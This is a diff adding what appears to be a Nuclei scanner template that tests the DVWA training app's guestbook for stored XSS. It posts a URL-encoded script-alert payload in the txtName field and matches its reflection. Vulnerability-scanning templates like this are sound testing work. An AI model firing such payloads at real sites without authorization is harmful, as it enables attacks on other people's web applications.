@@ -1,0 +1,22 @@
+id: xss-test
+
+info:
+  name: XSS on DVWA
+  author: Sis
+  severity: critical
+
+requests:
+  - raw:
+      - |
+        POST /vulnerabilities/xss_s/ HTTP/1.1
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+     
+        txtName=%3Cscript%3Ealert(%22Xss%22)%3C/script%3E&mtxMessage=test&btnSign=Sign+Guestbook
+
+    cookie-reuse: true
+    matchers:
+      - type: word
+        words:
+          - "<script>alert(\"Xss\")</script>"
